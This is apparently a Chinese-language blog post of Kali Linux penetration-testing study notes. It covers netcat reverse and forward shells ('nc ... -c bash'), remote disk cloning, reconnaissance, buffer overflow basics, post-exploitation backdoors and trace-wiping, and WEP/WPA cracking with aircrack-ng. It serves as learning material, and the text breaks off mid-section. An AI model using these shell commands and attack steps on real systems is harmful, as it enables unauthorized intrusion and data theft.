@@ -1,0 +1,1578 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>kali | Mkey的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kali">
+<meta property="og:url" content="https://monkeyh0ck.github.io/2022/03/01/kali/index.html">
+<meta property="og:site_name" content="Mkey的博客">
+<meta property="og:description" content="kali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2022/03/01/kali/image-20220320154414066.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2022/03/01/kali/image-20220322223107754.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2022/03/01/kali/image-20220404110646509.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2022/03/01/kali/image-20220404110927825.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2022/03/01/kali/image-20220404220109238.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2022/03/01/kali/%E6%88%AA%E5%B1%8F2022-04-05%2015.46.07.png">
+<meta property="article:published_time" content="2022-02-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-26T13:38:44.715Z">
+<meta property="article:author" content="HOU">
+<meta property="article:tag" content="web-security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://monkeyh0ck.github.io/2022/03/01/kali/image-20220320154414066.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Mkey的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mkey的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://monkeyh0ck.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-kali" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/03/01/kali/" class="article-date">
+  <time class="dt-published" datetime="2022-02-28T16:00:00.000Z" itemprop="datePublished">2022-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      kali
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h1><span id="more"></span>
+
+<blockquote>
+<p>2022.3</p>
+</blockquote>
+<h2 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h2><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>netcat</p>
+<h4 id="nc支持的功能"><a href="#nc支持的功能" class="headerlink" title="nc支持的功能"></a>nc支持的功能</h4><ul>
+<li>监听&#x2F;传输模式</li>
+<li>telnet&#x2F;获取banner信息</li>
+<li>传输文本信息</li>
+<li>传输文件&#x2F;目录</li>
+<li>加密传输文件</li>
+<li>远程控制&#x2F;木马</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+<li>远程克隆硬盘</li>
+</ul>
+<h4 id="telnet-x2F-banner"><a href="#telnet-x2F-banner" class="headerlink" title="telnet&#x2F;banner"></a>telnet&#x2F;banner</h4><p><code>nc -nv IP port</code>连接ip地址与对应端口</p>
+<p><code>nc -l port</code>监听端口</p>
+<p>传输文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">文件从端口发送给监听端口</span><br><span class="line">nc -lp port &gt; filename					监听端口，将接收到的文件写入对应的文件中</span><br><span class="line">nc -nv ip port &lt; filename -q 1	连接监听端口将对应的文件传送过去</span><br><span class="line"></span><br><span class="line">文件从监听端口发给连接端口</span><br><span class="line">nc -q 1 -lp port &lt; filename		将文件写入监听端口，等待连接，将文件发给连接的端口</span><br><span class="line">nc -nv ip port &gt; filename			连接监听端口，接受文件</span><br><span class="line"></span><br><span class="line">使用管道传输文件</span><br><span class="line">tar -xvf -music/ ｜ nc -nv ip port &gt; filename</span><br></pre></td></tr></table></figure>
+
+<p>扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz ip ports(1-65535)</span><br><span class="line">nc -vnzu ip ports</span><br></pre></td></tr></table></figure>
+
+<p>远程克隆硬盘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lp port  | dd of=/dev/sda</span><br><span class="line">dd if=/dev/sda | nc -nv ip port -q 1</span><br></pre></td></tr></table></figure>
+
+<p>dd 可以实现硬盘的块级复制，bit级别复制</p>
+<p>远程控制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正向</span><br><span class="line">nc -lp port -c bash</span><br><span class="line">nc -nv ip port</span><br><span class="line"></span><br><span class="line">反向</span><br><span class="line">nc -lp port</span><br><span class="line">nc -nv ip port -c bash</span><br></pre></td></tr></table></figure>
+
+<p>nc传输都是明文传输，缺乏加密传输</p>
+<p><code>--ssl</code>加密传输</p>
+<h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><h4 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h4><p>命令行抓包</p>
+<p>默认只抓68个字节</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -s 0 -w filename</span><br><span class="line">-i 抓包端口</span><br><span class="line">-s 设置抓包大小，0则全部抓下</span><br><span class="line">-w 输出文件</span><br><span class="line"></span><br><span class="line">筛选</span><br><span class="line">tcpdump -n -r http.cap | awk &#x27;&#123;print $3&#125;&#x27; | sort -u</span><br><span class="line">-r读取http.cap，-n不做额外筛选，awk筛选第三列，sort取消重复</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><ul>
+<li><p>nslookup</p>
+<p>查询ip地址解析</p>
+<p><code>nslookup sina.com -type=any 8.8.8</code></p>
+</li>
+</ul>
+<h4 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h4><ul>
+<li><p>dig</p>
+<p><code>dig sina.com any @8.8.8.8</code></p>
+</li>
+<li><p>host</p>
+</li>
+</ul>
+<h4 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h4><ul>
+<li>fierce</li>
+<li>dnsdict6</li>
+<li>dnsenum</li>
+<li>dnsmap</li>
+<li>dnsrecon</li>
+</ul>
+<h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><ul>
+<li>参数<ul>
+<li>net</li>
+<li>city</li>
+<li>country</li>
+<li>port</li>
+<li>os</li>
+<li>hostname</li>
+<li>Server</li>
+</ul>
+</li>
+</ul>
+<h4 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h4><p>图片的属性中可能会包含很多重要信息</p>
+<ul>
+<li>拍摄设备</li>
+<li>东经</li>
+<li>北纬</li>
+<li>时间</li>
+<li>等</li>
+</ul>
+<h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><h3 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h3><ul>
+<li><p>arping</p>
+</li>
+<li><p>nmap</p>
+</li>
+<li><p>netdiscover</p>
+</li>
+<li><p>scapy</p>
+<ul>
+<li>可以构造发送的包</li>
+</ul>
+</li>
+</ul>
+<h3 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h3><p>使用IP、ICMP协议</p>
+<p>优点</p>
+<ul>
+<li>可路由</li>
+<li>速度比较快</li>
+</ul>
+<p>缺点</p>
+<ul>
+<li>速度比二层慢</li>
+<li>经常被边界防火墙过滤</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ping ip -c 2</span><br><span class="line">ping -r ip</span><br><span class="line">traceroute ip</span><br><span class="line">显示路径上的路由器</span><br><span class="line"></span><br><span class="line">fping 扫描地址段</span><br><span class="line">hping </span><br><span class="line">能够发送几乎任意TCP/IP包</span><br><span class="line">功能强大但每次只能扫描一个目标</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h3><p>优点</p>
+<ul>
+<li>可路由且结果可靠</li>
+<li>不太可能被防火墙过滤</li>
+<li>甚至可以发现所有端口都被过滤的主机</li>
+</ul>
+<p>缺点</p>
+<ul>
+<li>基于状态过滤的防火墙可能过滤扫描</li>
+<li>却端口扫描速度慢</li>
+</ul>
+<p>TCP</p>
+<ul>
+<li>未经请求的ACK——RST</li>
+<li>SYN——SYN&#x2F;ACK、RST</li>
+</ul>
+<p>UDP</p>
+<ul>
+<li>ICMP端口不可达</li>
+</ul>
+<p>工具</p>
+<ul>
+<li>nmap</li>
+<li>scapy</li>
+<li>hping</li>
+</ul>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="隐藏扫描"><a href="#隐藏扫描" class="headerlink" title="隐藏扫描"></a>隐藏扫描</h4><ul>
+<li>nmap -sS -p</li>
+<li>hping3 ip –scan port</li>
+<li>scapy</li>
+</ul>
+<h4 id="僵尸扫描"><a href="#僵尸扫描" class="headerlink" title="僵尸扫描"></a>僵尸扫描</h4><p><img src="/2022/03/01/kali/image-20220320154414066.png" alt="image-20220320154414066"></p>
+<p>两次僵尸机返回的ip增加2，代表目标主机对僵尸记发送了syn请求，需要<strong>快速发包</strong>，防止被其他包干扰。</p>
+<p>可以通过scapy构造包，实现僵尸扫描</p>
+<p>可以用nmap的脚本实现僵尸扫描</p>
+<h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><ul>
+<li><p>识别开发端口上运行的服务</p>
+</li>
+<li><p>识别操作系统</p>
+</li>
+<li><p>提高供给效率</p>
+<ul>
+<li>banner捕获</li>
+<li>服务识别</li>
+<li>操作系统识别</li>
+<li>SNMP分析<ul>
+<li>简单网络管理协议</li>
+<li>community strings</li>
+<li>信息查询或重新配置</li>
+</ul>
+</li>
+<li>防火墙识别</li>
+</ul>
+</li>
+</ul>
+<p>工具</p>
+<ul>
+<li>识别banner信息<ul>
+<li>nc</li>
+<li>socket python</li>
+<li>dmitry</li>
+<li>nmap</li>
+</ul>
+</li>
+<li>操作系统识别<ul>
+<li>TTL起始值<ul>
+<li>windows：128</li>
+<li>linux：64</li>
+<li>unix：255</li>
+</ul>
+</li>
+<li>nmap -O</li>
+<li>xprobe2</li>
+</ul>
+</li>
+<li>snmp扫描<ul>
+<li>收集目标主机的配置信息</li>
+<li>snmpwalk</li>
+<li>snmpcheck</li>
+</ul>
+</li>
+<li>SMB扫描<ul>
+<li>nmap -v -p –script&#x3D;smb-check-vulns –script-args&#x3D;unsafe&#x3D;1 ip</li>
+<li>nbtscan -r</li>
+<li>enum4linux -a</li>
+</ul>
+</li>
+<li>smtp扫描<ul>
+<li>nc</li>
+<li>nmap</li>
+</ul>
+</li>
+</ul>
+<p>防火墙识别</p>
+<p><img src="/2022/03/01/kali/image-20220322223107754.png" alt="image-20220322223107754"></p>
+<ul>
+<li>wafw00f</li>
+<li>nmap</li>
+</ul>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><ul>
+<li>OPENVAS<ul>
+<li>nessus的分支</li>
+</ul>
+</li>
+<li>NESSUS</li>
+<li>NEXPOSE</li>
+</ul>
+<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><blockquote>
+<p>漏洞来源</p>
+<ul>
+<li>变量</li>
+<li>数据与代码边界不清</li>
+</ul>
+</blockquote>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a.sh:</span><br><span class="line"></span><br><span class="line">#!/bin/bash</span><br><span class="line">echo $1</span><br><span class="line">回显第一个参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">但是 ./a.sh ;pwd</span><br><span class="line">会显示当前路径，实现漏洞</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="FUZZING"><a href="#FUZZING" class="headerlink" title="FUZZING"></a>FUZZING</h4><p>EIP：记录下一个运行的指令地址</p>
+<p>ESP：堆指针寄存器，内存放一个指针，永远指向系统栈最上面的一个栈桢的栈顶</p>
+<p>EBP：基址指针寄存器，指向系统栈最上面的一个栈帧的底部</p>
+<p>符合精确找出溢出的4个字节</p>
+<ul>
+<li>二分法</li>
+<li>唯一字串法</li>
+</ul>
+<p>坏字符的作用</p>
+<ul>
+<li>返回地址、shellcode、buffer中不能出现的坏字符</li>
+<li>null byte （0x00）空字符，用于终止字符串拷贝操作</li>
+<li>return（0x0D）回车操作，表示命令输入完成</li>
+</ul>
+<p>发现坏字符的思路：发送0x00——0xff   256个字符，查找所有坏字符</p>
+<blockquote>
+<p>在找到溢出字符后，利用方式，将EIP通过溢出，将存储内容替换为ESP的地址，实现运行我们期望的命令</p>
+</blockquote>
+<p>重定向数据流</p>
+<ul>
+<li>用ESP的地址替换EIP的值</li>
+<li>ESP地址变化，硬编码不可行</li>
+<li><strong>变通思路</strong><ul>
+<li>在内存中寻找地址固定的系统模块</li>
+<li>在模块中寻找<code>JMP ESP</code>指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode</li>
+</ul>
+</li>
+</ul>
+<h3 id="linux缓冲区溢出"><a href="#linux缓冲区溢出" class="headerlink" title="linux缓冲区溢出"></a>linux缓冲区溢出</h3><p>edb-linux下的汇编工具</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>避免有害EXP</p>
+<ul>
+<li>不同的EXP<ul>
+<li>不同的系统补丁</li>
+<li>软件版本</li>
+<li>不同的offset、shellcode</li>
+</ul>
+</li>
+<li>扫描探测目标系统版本，搭建适当的测试环境<ul>
+<li>避免——锤子测试：一个程序进行溢出攻击后，除非重启程序，否则无法进行第二次攻击</li>
+</ul>
+</li>
+<li>修改公开的EXP满足不同环境需求<ul>
+<li>了解漏洞原理，修改溢出代码</li>
+</ul>
+</li>
+</ul>
+<h4 id="漏洞利用后阶段"><a href="#漏洞利用后阶段" class="headerlink" title="漏洞利用后阶段"></a>漏洞利用后阶段</h4><ul>
+<li>上传工具<ul>
+<li>持久控制</li>
+<li>扩大对目标系统对控制能力</li>
+</ul>
+</li>
+<li>提权</li>
+<li>擦出攻击痕迹</li>
+<li>安装后门<ul>
+<li>长期控制</li>
+<li>Dump密码</li>
+<li>内网渗透</li>
+</ul>
+</li>
+<li>后漏洞利用阶段<ul>
+<li>最大挑战——防病毒软件</li>
+<li>使用合法的远程控制软件</li>
+</ul>
+</li>
+</ul>
+<p>非交互模式shell</p>
+<ul>
+<li>类NC远程控制shell</li>
+</ul>
+<p>文件传输方法</p>
+<ul>
+<li>linux<ul>
+<li>curl</li>
+<li>wget</li>
+<li>nc</li>
+</ul>
+</li>
+<li>win<ul>
+<li>tftp</li>
+<li>ftp</li>
+<li>vbscript</li>
+<li>powershell</li>
+<li>debug</li>
+</ul>
+</li>
+</ul>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>win</p>
+<ul>
+<li>user</li>
+<li>administer</li>
+<li>system</li>
+</ul>
+<p>linux</p>
+<ul>
+<li>user</li>
+<li>root</li>
+</ul>
+<p>在windos中，将命令注入到进程中，则可获得该进程的权限。</p>
+<p>键盘记录</p>
+<ul>
+<li>keylogger</li>
+<li>木马窃取</li>
+</ul>
+<h4 id="本地缓存密码"><a href="#本地缓存密码" class="headerlink" title="本地缓存密码"></a>本地缓存密码</h4><ul>
+<li>浏览器缓存密码</li>
+<li>网络密码</li>
+<li>无线密码</li>
+<li>pwdump</li>
+</ul>
+<h4 id="windows身份认证过程"><a href="#windows身份认证过程" class="headerlink" title="windows身份认证过程"></a>windows身份认证过程</h4><p>win将密码经过hash计算，存储为LMHash、NTHash</p>
+<ul>
+<li><p><strong>WCE工具</strong>读取win密码的hash</p>
+</li>
+<li><p>fgdump</p>
+</li>
+<li><p><strong>mimikatz</strong></p>
+</li>
+</ul>
+<h4 id="利用漏洞提权"><a href="#利用漏洞提权" class="headerlink" title="利用漏洞提权"></a>利用漏洞提权</h4><ul>
+<li>MS11-080<ul>
+<li>中文xp系统会蓝屏重启，英文xp系统则会获取system权限</li>
+</ul>
+</li>
+</ul>
+<h4 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a>利用配置不当提权</h4><ul>
+<li><p>与漏洞提权相比更加常用</p>
+<ul>
+<li>以system权限启动</li>
+</ul>
+</li>
+<li><p>提权方法</p>
+<ul>
+<li><p>重命名，替换运行程序</p>
+</li>
+<li><p>修改服务，注册表等，使启动服务时，启动攻击程序</p>
+</li>
+</ul>
+</li>
+<li><p>基础信息收集</p>
+<ul>
+<li>linux<ul>
+<li>&#x2F;etc&#x2F;password</li>
+<li>&#x2F;etc&#x2F;shadow</li>
+<li>whoami</li>
+<li>ifconfig</li>
+<li>iptables</li>
+<li>netstat</li>
+<li>uname</li>
+<li>ps</li>
+<li>dpkg</li>
+<li>.ssh</li>
+<li>&#x2F;tmp</li>
+<li>history</li>
+<li>lastlog</li>
+<li>faillog</li>
+<li>btmp</li>
+<li>wtmp</li>
+</ul>
+</li>
+<li>windows<ul>
+<li>ipconfig</li>
+<li>displaydns</li>
+<li>netstat</li>
+<li>net</li>
+<li>SAM</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="无线攻击"><a href="#无线攻击" class="headerlink" title="无线攻击"></a>无线攻击</h2><p>Dmesg      记录硬件变化</p>
+<p>ap 路由器</p>
+<p>sta 终端</p>
+<p>工作模式</p>
+<ul>
+<li><p>infrastructure</p>
+<ul>
+<li>ap维护ssid</li>
+<li><img src="/2022/03/01/kali/image-20220404110646509.png" alt="image-20220404110646509"></li>
+</ul>
+</li>
+<li><p>Ad-Hoc</p>
+<ul>
+<li>sta维护ssid</li>
+</ul>
+</li>
+<li><p>service set identifier</p>
+<ul>
+<li>ap每秒10次广播ssid</li>
+<li>客户端连接到无线网络后也宣告ssid</li>
+</ul>
+</li>
+<li><p>WDS（wireless distribution system）</p>
+<ul>
+<li>bridging 只有ap间彼此通讯</li>
+<li>repeating 允许所有ap和sta进行通信</li>
+<li>两个ap可以通过一个sta进行连接，sta之间无法通讯</li>
+<li><img src="/2022/03/01/kali/image-20220404110927825.png" alt="image-20220404110927825"></li>
+</ul>
+</li>
+<li><p>monitor</p>
+<ul>
+<li>不是真实无线模式</li>
+<li>允许无线网卡没有任何筛选的抓包</li>
+<li>适合的网卡和驱动不但可以monitor，还可以inject</li>
+</ul>
+</li>
+</ul>
+<p>查看无线网卡的命令</p>
+<ul>
+<li>iwconfig</li>
+<li>iwlist</li>
+<li>iw</li>
+<li>iw list</li>
+</ul>
+<p>扫描附近AP</p>
+<ul>
+<li>iw dev wlan2 scan </li>
+<li>iwlist wlan2 scanning</li>
+</ul>
+<h3 id="radiotap"><a href="#radiotap" class="headerlink" title="radiotap"></a>radiotap</h3><p>radiotap包头长度不固定，厂家自定义包头内容</p>
+<p>radiotap分为header和data</p>
+<ul>
+<li>version（8bit）<ul>
+<li>始终为0</li>
+</ul>
+</li>
+<li>pad（8bit）<ul>
+<li>未使用的占位符</li>
+</ul>
+</li>
+<li>length（16bit）<ul>
+<li>整个radiotap头的长度，标记802.11头的开始位置</li>
+</ul>
+</li>
+<li>present（32bit）<ul>
+<li>data段段掩码</li>
+<li>最后一位为ext，如果为1后面再接一个present，0则结束</li>
+</ul>
+</li>
+</ul>
+<h3 id="802-11"><a href="#802-11" class="headerlink" title="802.11"></a>802.11</h3><ul>
+<li>DU 数据单元，信息传输的最小数据集合</li>
+<li>传输过程逐层封装</li>
+<li>SDU&#x2F;PDU</li>
+<li>MSDU -&gt; mic -&gt; 分帧 -&gt; 添加IV -&gt; 加密 -&gt; 添加MAC头部 -&gt; MPDU</li>
+<li>MPDU&#x2F;PSDU + 物理头 -&gt; PPDU -&gt; RF发射</li>
+</ul>
+<h4 id="802-11头部"><a href="#802-11头部" class="headerlink" title="802.11头部"></a>802.11头部</h4><p>mac头部结构</p>
+<p><img src="/2022/03/01/kali/image-20220404220109238.png" alt="image-20220404220109238"></p>
+<ul>
+<li>protocol version （2bit）</li>
+<li>type （2bit）<ul>
+<li>控制帧（1）</li>
+<li>数据帧（2）</li>
+<li>管理帧（0）</li>
+</ul>
+</li>
+<li>subtype（4bit）</li>
+</ul>
+<p>SSID：网络名</p>
+<h4 id="无线连接"><a href="#无线连接" class="headerlink" title="无线连接"></a>无线连接</h4><ul>
+<li><p>PROBE REQUEST FRAMES</p>
+<ul>
+<li>用于STA扫描现有AP</li>
+</ul>
+</li>
+<li><p>PROBE RESPONSE FRAMES</p>
+<ul>
+<li>发现连结果的AP时，速率和ESSID都相同的AP会响应，发出该帧</li>
+</ul>
+</li>
+<li><p>AUTHENTICATION FRAMES</p>
+<ul>
+<li>身份认证</li>
+</ul>
+</li>
+<li><p>ASSOCIATION REQUEST</p>
+<ul>
+<li>连接请求</li>
+</ul>
+</li>
+<li><p>ASSOCIATION RESPONSE</p>
+<ul>
+<li>连接响应</li>
+</ul>
+</li>
+<li><p>DISASSOCATION</p>
+<ul>
+<li>报错</li>
+</ul>
+</li>
+<li><p>ATIM FRAMES</p>
+<ul>
+<li>只在ad-hoc网络下使用</li>
+<li>STA使用此帧通知接受者其有缓存的数据要发送</li>
+</ul>
+</li>
+<li><p>DATA FRAMES</p>
+<ul>
+<li>传输用户数据</li>
+<li>空数据帧<ul>
+<li>值包含MAC头和FCS</li>
+<li>STA用于生命自己进入省电模式</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="无线连接流程"><a href="#无线连接流程" class="headerlink" title="无线连接流程"></a>无线连接流程</h4><p><img src="/2022/03/01/kali/%E6%88%AA%E5%B1%8F2022-04-05%2015.46.07.png" alt="截屏2022-04-05 15.46.07"></p>
+<h4 id="WEP探测过程"><a href="#WEP探测过程" class="headerlink" title="WEP探测过程"></a>WEP探测过程</h4><ul>
+<li>beacon标识使用WEP加密</li>
+<li>STA发送普通Probe帧</li>
+<li>AP响应Probe response帧声明其采用的WEP加密</li>
+</ul>
+<h4 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a>WPA安全系统</h4><p>WEP和WPA都是利用多套加密的安全系统</p>
+<h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h4><ul>
+<li>单波通信需要单独密钥加密通信双方流量<ul>
+<li>pairwise key 对偶密钥（PTK）</li>
+</ul>
+</li>
+<li>组播通信需要信任域内所有成员共享同一密钥<ul>
+<li>group key 组密钥（GTK）</li>
+</ul>
+</li>
+</ul>
+<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><h4 id="AIRCRACK-NG基础"><a href="#AIRCRACK-NG基础" class="headerlink" title="AIRCRACK-NG基础"></a>AIRCRACK-NG基础</h4><p>无线渗透和审计神器</p>
+<p>包含功能：</p>
+<ul>
+<li>网络检测</li>
+<li>嗅探抓包</li>
+<li>包注入</li>
+<li>密码破解</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan2</span><br><span class="line">airmon-ng stop wlan2</span><br><span class="line">airodump-ng wlan2     监听各个信道的通信，在各个信道轮训扫描该信道的AP</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>AIRODUMP-NG</strong></p>
+<ul>
+<li>BSSID<ul>
+<li>AP的MAC地址</li>
+</ul>
+</li>
+<li>PWR<ul>
+<li>网卡接受到的信号强度</li>
+</ul>
+</li>
+<li>RXQ<ul>
+<li>最近10秒成功接收到的数据帧的百分比</li>
+</ul>
+</li>
+<li>Beacons<ul>
+<li>接收到此AP发送的beacon帧数量</li>
+</ul>
+</li>
+<li>#DATA<ul>
+<li>抓到的数据帧数量</li>
+</ul>
+</li>
+<li>#&#x2F;s<ul>
+<li>最近10秒内，每秒平均抓到的帧的数量</li>
+</ul>
+</li>
+<li>CH<ul>
+<li>信道号</li>
+</ul>
+</li>
+<li>MB<ul>
+<li>AP支持的最大速率</li>
+</ul>
+</li>
+<li>ENC<ul>
+<li>采用的无线安全技术WEP、WPA、WPA2、OPEN</li>
+</ul>
+</li>
+<li>CIPHER<ul>
+<li>采用的加密套件</li>
+</ul>
+</li>
+<li>AUTH<ul>
+<li>身份认证方法</li>
+</ul>
+</li>
+<li>ESSID<ul>
+<li>无线网络名称，隐藏AP此值可能为空</li>
+</ul>
+</li>
+<li>STATION<ul>
+<li>STA的MAC地址</li>
+</ul>
+</li>
+<li>LOST<ul>
+<li>通过sequence number判断最近10秒STA发送的数据包数量</li>
+</ul>
+</li>
+<li>PACKETS<ul>
+<li>STA发送的数据包数量</li>
+</ul>
+</li>
+<li>Probes<ul>
+<li>STA探测的ESSID</li>
+</ul>
+</li>
+</ul>
+<p><strong>AIREPLAY-NG</strong></p>
+<p>向无线网络中注入数据包</p>
+<ul>
+<li>伪造身份验证</li>
+<li>强制重新身份认证</li>
+<li>抓包重放</li>
+<li>用于后续WEP和WPA密码破解</li>
+<li>支持10种包注入</li>
+</ul>
+<p><strong>mac地址绑定</strong></p>
+<p>抓包发现绑定的mac地址，修改mac地址，实现连接AP</p>
+<h4 id="WEP攻击"><a href="#WEP攻击" class="headerlink" title="WEP攻击"></a>WEP攻击</h4><p><strong>WEP密码破解原理</strong></p>
+<ul>
+<li>IV并非完全随机</li>
+<li>每224个包可能出现一次IV重用</li>
+<li>收集大量IV之后找出相同IV及其对应密文，分析得出共享密码</li>
+</ul>
+<p><strong>破解步骤</strong></p>
+<ul>
+<li>启动monitor模式</li>
+<li>启动抓包并保存抓包</li>
+<li>deauthentication抓去XOR文件<ul>
+<li>deauthentication，解除认证，断开链接</li>
+<li>在STA断开链接后，STA会重新请求AP建立链接</li>
+<li>即可知道密文内容，推出ekystream</li>
+</ul>
+</li>
+<li>利用XOR文件与AP建立关联</li>
+<li>执行ARP重放<ul>
+<li>侦听正常ARP包重放给AP</li>
+<li>AP回包中包含大量弱IV</li>
+</ul>
+</li>
+<li>deauthentication触发ARP数据包</li>
+<li>收集足够DATA之后破解密码</li>
+</ul>
+<h4 id="WPA攻击"><a href="#WPA攻击" class="headerlink" title="WPA攻击"></a>WPA攻击</h4><p>不存在密码破解技巧，只能依靠暴力破解</p>
+<p>PSK破解过程</p>
+<ul>
+<li>启动monitor</li>
